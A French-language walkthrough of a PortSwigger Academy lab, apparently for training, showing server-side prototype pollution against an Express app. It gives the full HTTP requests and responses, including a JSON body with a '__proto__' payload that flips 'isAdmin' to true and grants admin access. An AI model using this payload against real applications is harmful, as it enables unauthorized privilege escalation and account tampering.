# Lab

https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution

## Solution

Sur ce lab, quand on se connecte avec le compte `wiener:peter`, on a la possibilité de modifier quelques informations de notre compte.

```html
POST /my-account/change-address HTTP/2
Host: 0a7200bc0321c0ad803ebccd001b0097.web-security-academy.net
Cookie: session=lX0eeW2NJ6xfkDv4zXAnlyxppw4ufAgH
Content-Length: 161
Content-Type: application/json;charset=UTF-8

{
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "city",
  "postcode": "BU1 1RP",
  "country": "UK",
  "sessionId": "lX0eeW2NJ6xfkDv4zXAnlyxppw4ufAgH"
}
```

Et on réponse on voit un paramètre `isAdmin` valorisé à `false`:

```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"be-yKPHaqORts+uJq/17a+NGfenBR8"
Date: Fri, 05 Jan 2024 11:22:55 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 190

{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "city",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": false
}
```

On peut essayer de polluer le prototype de l'objet `req.session` pour modifier la valeur de `isAdmin` à `true`.

```html
POST /my-account/change-address HTTP/2
Host: 0a7200bc0321c0ad803ebccd001b0097.web-security-academy.net
Cookie: session=lX0eeW2NJ6xfkDv4zXAnlyxppw4ufAgH
Content-Length: 83
Content-Type: application/json;charset=UTF-8

{
    "sessionId":"lX0eeW2NJ6xfkDv4zXAnlyxppw4ufAgH",
    "__proto__": {
        "isAdmin": true
    }
}
```

Et on réponse on voit qu'on est bien admin:

```http
HTTP/2 200 OK
X-Powered-By: Express
Cache-Control: no-store
Content-Type: application/json; charset=utf-8
Etag: W/"bd-L8y/5aMbXXJM1UBoGhApdoVQX5U"
Date: Fri, 05 Jan 2024 11:25:02 GMT
Keep-Alive: timeout=5
X-Frame-Options: SAMEORIGIN
Content-Length: 189

{
  "username": "wiener",
  "firstname": "Peter",
  "lastname": "Wiener",
  "address_line_1": "Wiener HQ",
  "address_line_2": "One Wiener Way",
  "city": "city",
  "postcode": "BU1 1RP",
  "country": "UK",
  "isAdmin": true
}
```

Maintenant on a accès à la page d'administration et on peut supprimer l'utilisateur `carlos` pour valider le lab.